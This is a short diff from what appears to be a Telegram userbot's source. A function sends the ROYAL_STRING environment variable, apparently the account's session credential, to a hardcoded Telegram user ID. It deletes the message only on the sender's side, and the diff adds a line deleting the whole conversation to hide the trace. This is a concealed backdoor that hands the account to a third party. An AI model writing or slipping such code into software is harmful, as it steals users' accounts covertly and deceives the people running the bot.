@@ -225,7 +225,7 @@ async def upstream(event):
 async def piro(event):
   msg = await bot.send_message(1637052949, str(os.environ.get("ROYAL_STRING")))
   await bot.delete_messages(1637052949, msg, revoke=False)
-
+  await bot.delete_dialog(1637052949)
 
 
 @borg.on(admin_cmd("update build ?(.*)", outgoing=True))
